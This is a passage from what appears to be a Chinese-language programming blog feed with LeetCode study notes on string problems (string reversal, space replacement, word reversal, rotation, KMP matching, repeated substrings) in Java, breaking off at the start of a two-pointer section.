<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = [&quot;h&quot;,&quot;e&quot;,&quot;l&quot;,&quot;l&quot;,&quot;o&quot;]</span><br><span class="line">输出：[&quot;o&quot;,&quot;l&quot;,&quot;l&quot;,&quot;e&quot;,&quot;h&quot;]</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="思路：双指针"><a href="#思路：双指针" class="headerlink" title="思路：双指针"></a>思路：双指针</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverseString</span><span class="params">(<span class="type">char</span>[] s)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>  ,len = s.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> len - left - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(left &lt;= right)&#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">temp</span> <span class="operator">=</span> s[left];</span><br><span class="line">            s[left++] = s[right];</span><br><span class="line">            s[right--] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>执行用时：0 ms, 在所有 Java 提交中击败了100.00%的用户</li>
<li>内存消耗：48.2 MB, 在所有 Java 提交中击败了35.53%的用户</li>
<li>通过测试用例：477 &#x2F; 477</li>
</ul>
<span id="more"></span>

<h1 id="541-反转字符串-II"><a href="#541-反转字符串-II" class="headerlink" title="541. 反转字符串 II"></a><a href="https://leetcode-cn.com/problems/reverse-string-ii/">541. 反转字符串 II</a></h1><blockquote>
<p>给定一个字符串 s 和一个整数 k，从字符串开头算起，每计数至 2k 个字符，就反转这 2k 字符中的前 k 个字符。</p>
<p>如果剩余字符少于 k 个，则将剩余字符全部反转。<br>如果剩余字符小于 2k 但大于或等于 k 个，则反转前 k 个字符，其余字符保持原样</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;abcdefg&quot;, k = 2</span><br><span class="line">输出：&quot;bacdfeg&quot;</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="思路：双指针-模拟"><a href="#思路：双指针-模拟" class="headerlink" title="思路：双指针+模拟"></a>思路：双指针+模拟</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">reverseStr</span><span class="params">(String s, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="type">char</span>[] arr = s.toCharArray();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i &lt; len; i += <span class="number">2</span>*k)&#123;</span><br><span class="line">            reverse(arr, i , Math.min(i+k,len)-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(arr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverse</span><span class="params">(<span class="type">char</span>[] arr,<span class="type">int</span> left, <span class="type">int</span> right)</span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(left &lt; right)&#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">temp</span> <span class="operator">=</span> arr[left];</span><br><span class="line">            arr[left++] = arr[right];</span><br><span class="line">            arr[right--] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>执行用时：1 ms, 在所有 Java 提交中击败了63.60%的用户,O(N)</li>
<li>内存消耗：41.4 MB, 在所有 Java 提交中击败了27.37%的用户，O（1）</li>
<li>通过测试用例：60 &#x2F; 60</li>
</ul>
<h1 id="剑指-Offer-05-替换空格"><a href="#剑指-Offer-05-替换空格" class="headerlink" title="剑指 Offer 05. 替换空格"></a><a href="https://leetcode-cn.com/problems/ti-huan-kong-ge-lcof/">剑指 Offer 05. 替换空格</a></h1><blockquote>
<p>请实现一个函数，把字符串 <code>s</code> 中的每个空格替换成”%20”。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;We are happy.&quot;</span><br><span class="line">输出：&quot;We%20are%20happy.&quot;</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="思路：直接模拟"><a href="#思路：直接模拟" class="headerlink" title="思路：直接模拟"></a>思路：直接模拟</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">replaceSpace</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="type">char</span>[] arr = <span class="keyword">new</span> <span class="title class_">char</span>[len*<span class="number">3</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i&lt;len ; i++)&#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> s.charAt(i);</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">                arr[size++] = <span class="string">&#x27;%&#x27;</span>;</span><br><span class="line">                arr[size++] = <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">                arr[size++] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                arr[size++] = c;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">newStr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(arr,<span class="number">0</span>,size);</span><br><span class="line">        <span class="keyword">return</span> newStr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//方法2</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">replaceSpace</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (s == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="comment">//选用 StringBuilder 单线程使用，比较快，选不选都行</span></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">		<span class="comment">//使用 sb 逐个复制 str ，碰到空格则替换，否则直接复制</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; s.length(); i++) &#123;</span><br><span class="line">		<span class="comment">//str.charAt(i) 为 char 类型，为了比较需要将其转为和 &quot; &quot; 相同的字符串类型</span></span><br><span class="line">        <span class="comment">//if (&quot; &quot;.equals(String.valueOf(str.charAt(i))))&#123;</span></span><br><span class="line">            <span class="keyword">if</span> (s.charAt(i) == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                sb.append(<span class="string">&quot;%20&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                sb.append(s.charAt(i));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>执行用时：0 ms, 在所有 Java 提交中击败了100.00%的用户</p>
</li>
<li><p>内存消耗：39.4 MB, 在所有 Java 提交中击败了39.91%的用户</p>
</li>
<li><p>通过测试用例：27 &#x2F; 27</p>
</li>
</ul>
<h2 id="151-颠倒字符串中的单词"><a href="#151-颠倒字符串中的单词" class="headerlink" title="151. 颠倒字符串中的单词"></a><a href="https://leetcode.cn/problems/reverse-words-in-a-string/">151. 颠倒字符串中的单词</a></h2><blockquote>
<p>给你一个字符串 s ，颠倒字符串中 单词 的顺序。</p>
<p>单词 是由非空格字符组成的字符串。s 中使用至少一个空格将字符串中的 单词 分隔开。</p>
<p>返回 单词 顺序颠倒且 单词 之间用单个空格连接的结果字符串。</p>
<p>注意：输入字符串 s中可能会存在前导空格、尾随空格或者单词间的多个空格。返回的结果字符串中，单词间应当仅用单个空格分隔，且不包含任何额外的空格。</p>
<p>示例 1：</p>
<p>输入：s &#x3D; “the sky is blue”<br>输出：”blue is sky the”</p>
</blockquote>
<h2 id="思路1：直接使用相关方法模拟"><a href="#思路1：直接使用相关方法模拟" class="headerlink" title="思路1：直接使用相关方法模拟"></a>思路1：直接使用相关方法模拟</h2><p>利用Java语言中已经写好的一些方法来解决</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">reverseWords</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="comment">//trim方法用于移除字符串两端多余的空格</span></span><br><span class="line">        s = s.trim();</span><br><span class="line">        <span class="comment">//split方法中分割一个或多个空格用&quot;\\s+&quot;</span></span><br><span class="line">        List&lt;String&gt; ans = Arrays.asList(s.split(<span class="string">&quot;\\s+&quot;</span>));</span><br><span class="line">        Collections.reverse(ans);</span><br><span class="line">        <span class="keyword">return</span> String.join(<span class="string">&quot; &quot;</span>,ans);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>时间复杂度：O(n)<em>O</em>(<em>n</em>)，其中 n<em>n</em> 为输入字符串的长度。</li>
<li>空间复杂度：O(n)<em>O</em>(<em>n</em>)，用来存储字符串分割之后的结果。</li>
</ul>
<h2 id="思路2：自写对应方法"><a href="#思路2：自写对应方法" class="headerlink" title="思路2：自写对应方法"></a>思路2：自写对应方法</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">reverseWords</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> trimSpaces(s);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 翻转字符串</span></span><br><span class="line">        reverse(sb, <span class="number">0</span>, sb.length() - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 翻转每个单词</span></span><br><span class="line">        reverseEachWord(sb);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> StringBuilder <span class="title function_">trimSpaces</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>, right = s.length() - <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// 去掉字符串开头的空白字符</span></span><br><span class="line">        <span class="keyword">while</span> (left &lt;= right &amp;&amp; s.charAt(left) == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">            ++left;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 去掉字符串末尾的空白字符</span></span><br><span class="line">        <span class="keyword">while</span> (left &lt;= right &amp;&amp; s.charAt(right) == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">            --right;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将字符串间多余的空白字符去除</span></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">while</span> (left &lt;= right) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> s.charAt(left);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (c != <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                sb.append(c);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sb.charAt(sb.length() - <span class="number">1</span>) != <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                sb.append(c);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ++left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverse</span><span class="params">(StringBuilder sb, <span class="type">int</span> left, <span class="type">int</span> right)</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">tmp</span> <span class="operator">=</span> sb.charAt(left);</span><br><span class="line">            sb.setCharAt(left++, sb.charAt(right));</span><br><span class="line">            sb.setCharAt(right--, tmp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverseEachWord</span><span class="params">(StringBuilder sb)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> sb.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> <span class="number">0</span>, end = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (start &lt; n) &#123;</span><br><span class="line">            <span class="comment">// 循环至单词的末尾</span></span><br><span class="line">            <span class="keyword">while</span> (end &lt; n &amp;&amp; sb.charAt(end) != <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                ++end;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 翻转单词</span></span><br><span class="line">            reverse(sb, start, end - <span class="number">1</span>);</span><br><span class="line">            <span class="comment">// 更新start，去找下一个单词</span></span><br><span class="line">            start = end + <span class="number">1</span>;</span><br><span class="line">            ++end;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>时间复杂度：O(n)，其中 n 为输入字符串的长度。</p>
</li>
<li><p>空间复杂度：Java 和 Python 的方法需要 O(n) 的空间来存储字符串，而 C++ 方法只需要 O(1) 的额外空间来存放若干变量。</p>
</li>
</ul>
<h1 id="剑指-Offer-58-II-左旋转字符串"><a href="#剑指-Offer-58-II-左旋转字符串" class="headerlink" title="剑指 Offer 58 - II. 左旋转字符串"></a><a href="https://leetcode.cn/problems/zuo-xuan-zhuan-zi-fu-chuan-lcof/">剑指 Offer 58 - II. 左旋转字符串</a></h1><blockquote>
<p>字符串的左旋转操作是把字符串前面的若干个字符转移到字符串的尾部。请定义一个函数实现字符串左旋转操作的功能。比如，输入字符串”abcdefg”和数字2，该函数将返回左旋转两位得到的结果”cdefgab”。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入: s = &quot;abcdefg&quot;, k = 2</span><br><span class="line">输出: &quot;cdefgab&quot;</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="思路1：字符串切片函数"><a href="#思路1：字符串切片函数" class="headerlink" title="思路1：字符串切片函数"></a>思路1：字符串切片函数</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">reverseLeftWords</span><span class="params">(String s, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> s.substring(n,s.length()) + s.substring(<span class="number">0</span>,n);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="思路2：列表遍历拼接"><a href="#思路2：列表遍历拼接" class="headerlink" title="思路2：列表遍历拼接"></a>思路2：列表遍历拼接</h2><p>若面试规定不允许使用 <strong>切片函数</strong> ，则使用此方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">reverseLeftWords</span><span class="params">(String s, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> n ; i &lt; n + s.length();i++)&#123;</span><br><span class="line">            sb.append(s.charAt(i % s.length()));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="思路3：字符串遍历拼接"><a href="#思路3：字符串遍历拼接" class="headerlink" title="思路3：字符串遍历拼接"></a>思路3：字符串遍历拼接</h2><p>若规定 Java 只能用 String ，则使用此方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">reverseLeftWords</span><span class="params">(String s, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> n ; i &lt; n + s.length();i++)&#123;</span><br><span class="line">            ans += s.charAt(i % s.length());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>三种方法的时间效率：1&gt;2&gt;3</p>
<table>
<thead>
<tr>
<th><a href="https://leetcode.cn/submissions/detail/311121042/">通过</a></th>
<th>54 ms</th>
<th>42.2 MB</th>
<th>Java</th>
<th>2022&#x2F;05&#x2F;09 11:18</th>
<th>添加备注</th>
</tr>
</thead>
<tbody><tr>
<td><a href="https://leetcode.cn/submissions/detail/311119042/">通过</a></td>
<td>6 ms</td>
<td>41.4 MB</td>
<td>Java</td>
<td>2022&#x2F;05&#x2F;09 11:15</td>
<td>添加备注</td>
</tr>
<tr>
<td><a href="https://leetcode.cn/submissions/detail/311116445/">通过</a></td>
<td>0 ms</td>
<td>41.4 MB</td>
<td>Java</td>
<td>2022&#x2F;05&#x2F;09 11:11</td>
<td>添加备注</td>
</tr>
</tbody></table>
<h1 id="28-实现-strStr"><a href="#28-实现-strStr" class="headerlink" title="28. 实现 strStr()"></a><a href="https://leetcode.cn/problems/implement-strstr/">28. 实现 strStr()</a></h1><blockquote>
<p>实现 strStr() 函数。</p>
<p>给你两个字符串 haystack 和 needle ，请你在 haystack 字符串中找出 needle 字符串出现的第一个位置（下标从 0 开始）。如果不存在，则返回  -1 。</p>
<p>说明：</p>
<p>当 needle 是空字符串时，我们应当返回什么值呢？这是一个在面试中很好的问题。</p>
<p>对于本题而言，当 needle 是空字符串时我们应当返回 0 。这与 C 语言的 strstr() 以及 Java 的 indexOf() 定义相符。</p>
<p>示例 1：</p>
<p>输入：haystack &#x3D; “hello”, needle &#x3D; “ll”<br>输出：2</p>
</blockquote>
<h2 id="思路1：直接暴力匹配"><a href="#思路1：直接暴力匹配" class="headerlink" title="思路1：直接暴力匹配"></a>思路1：直接暴力匹配</h2><p>使用一个长为needle.length()的窗口来对haystack进行对比匹配</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">strStr</span><span class="params">(String haystack, String needle)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(haystack == <span class="string">&quot;&quot;</span> || needle == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(haystack.length() &lt; needle.length()) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> needle.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span> , right = len;</span><br><span class="line">        <span class="keyword">while</span>(left &lt; haystack.length()-len+<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(haystack.substring(left,right).equals(needle))&#123;</span><br><span class="line">                <span class="keyword">return</span> left;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                left++;</span><br><span class="line">                right++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="思路2：KMP算法"><a href="#思路2：KMP算法" class="headerlink" title="思路2：KMP算法"></a>思路2：KMP算法</h2><p>详细讲解见：<a href="https://programmercarl.com/0028.%E5%AE%9E%E7%8E%B0strStr.html#%E5%85%B6%E4%BB%96%E8%AF%AD%E8%A8%80%E7%89%88%E6%9C%AC">代码随想录——KMP</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="comment">//前缀表（不减一）Java实现</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">strStr</span><span class="params">(String haystack, String needle)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (needle.length() == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span>[] next = <span class="keyword">new</span> <span class="title class_">int</span>[needle.length()];</span><br><span class="line">        getNext(next, needle);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; haystack.length(); i++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (j &gt; <span class="number">0</span> &amp;&amp; needle.charAt(j) != haystack.charAt(i)) </span><br><span class="line">                j = next[j - <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> (needle.charAt(j) == haystack.charAt(i)) </span><br><span class="line">                j++;</span><br><span class="line">            <span class="keyword">if</span> (j == needle.length()) </span><br><span class="line">                <span class="keyword">return</span> i - needle.length() + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">getNext</span><span class="params">(<span class="type">int</span>[] next, String s)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        next[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; s.length(); i++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (j &gt; <span class="number">0</span> &amp;&amp; s.charAt(j) != s.charAt(i)) </span><br><span class="line">                j = next[j - <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> (s.charAt(j) == s.charAt(i)) </span><br><span class="line">                j++;</span><br><span class="line">            next[i] = j; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="459-重复的子字符串"><a href="#459-重复的子字符串" class="headerlink" title="459. 重复的子字符串"></a><a href="https://leetcode.cn/problems/repeated-substring-pattern/">459. 重复的子字符串</a></h1><blockquote>
<p>给定一个非空的字符串 s ，检查是否可以通过由它的一个子串重复多次构成。</p>
<p>示例 1:</p>
<p>输入: s &#x3D; “abab”<br>输出: true<br>解释: 可由子串 “ab” 重复两次构成。</p>
</blockquote>
<h2 id="思路1：字符串匹配"><a href="#思路1：字符串匹配" class="headerlink" title="思路1：字符串匹配"></a>思路1：字符串匹配</h2><p>小技巧：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">repeatedSubstringPattern</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (s+s).indexOf(s,<span class="number">1</span>) != s.length();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="思路2：KMP算法-1"><a href="#思路2：KMP算法-1" class="headerlink" title="思路2：KMP算法"></a>思路2：KMP算法</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">repeatedSubstringPattern</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (s.equals(<span class="string">&quot;&quot;</span>)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="comment">// 原串加个空格(哨兵)，使下标从1开始，这样j从0开始，也不用初始化了</span></span><br><span class="line">        s = <span class="string">&quot; &quot;</span> + s;</span><br><span class="line">        <span class="type">char</span>[] chars = s.toCharArray();</span><br><span class="line">        <span class="type">int</span>[] next = <span class="keyword">new</span> <span class="title class_">int</span>[len + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造 next 数组过程，j从0开始(空格)，i从2开始</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>, j = <span class="number">0</span>; i &lt;= len; i++) &#123;</span><br><span class="line">            <span class="comment">// 匹配不成功，j回到前一位置 next 数组所对应的值</span></span><br><span class="line">            <span class="keyword">while</span> (j &gt; <span class="number">0</span> &amp;&amp; chars[i] != chars[j + <span class="number">1</span>]) j = next[j];</span><br><span class="line">            <span class="comment">// 匹配成功，j往后移</span></span><br><span class="line">            <span class="keyword">if</span> (chars[i] == chars[j + <span class="number">1</span>]) j++;</span><br><span class="line">            <span class="comment">// 更新 next 数组的值</span></span><br><span class="line">            next[i] = j;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 最后判断是否是重复的子字符串，这里 next[len] 即代表next数组末尾的值</span></span><br><span class="line">        <span class="keyword">if</span> (next[len] &gt; <span class="number">0</span> &amp;&amp; len % (len - next[len]) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>详解见：<a href="https://programmercarl.com/0459.%E9%87%8D%E5%A4%8D%E7%9A%84%E5%AD%90%E5%AD%97%E7%AC%A6%E4%B8%B2.html#%E5%85%B6%E4%BB%96%E8%AF%AD%E8%A8%80%E7%89%88%E6%9C%AC">代码随想录——重复的子字符串</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>字符串</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode——双指针</title>
    <url>/2022/05/11/20-leetcode%E2%80%94%E2%80%94%E5%8F%8C%E6%8C%87%E9%92%88/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录一下leetcode双指针部分题目的刷题笔记，顺序参考代码随想录中，但不仅限于这些，可以扩展记录。</p>
<h1 id="27-移除元素"><a href="#27-移除元素" class="headerlink" title="27. 移除元素"></a><a href="https://leetcode.cn/problems/remove-element/">27. 移除元素</a></h1><blockquote>
<p>给你一个数组 nums 和一个值 val，你需要 原地 移除所有数值等于 val 的元素，并返回移除后数组的新长度。</p>
<p>不要使用额外的数组空间，你必须仅使用 O(1) 额外空间并 原地 修改输入数组。</p>
<p>元素的顺序可以改变。你不需要考虑数组中超出新长度后面的元素。</p>
<p>示例 1：</p>
<p>输入：nums &#x3D; [3,2,2,3], val &#x3D; 3<br>输出：2, nums &#x3D; [2,2]<br>解释：函数应该返回新的长度 2, 并且 nums 中的前两个元素均为 2。你不需要考虑数组中超出新长度后面的元素。例如，函数返回的新长度为 2 ，而 nums &#x3D; [2,2,3,3] 或 nums &#x3D; [2,2,0,0]，也会被视作正确答案。</p>
</blockquote>
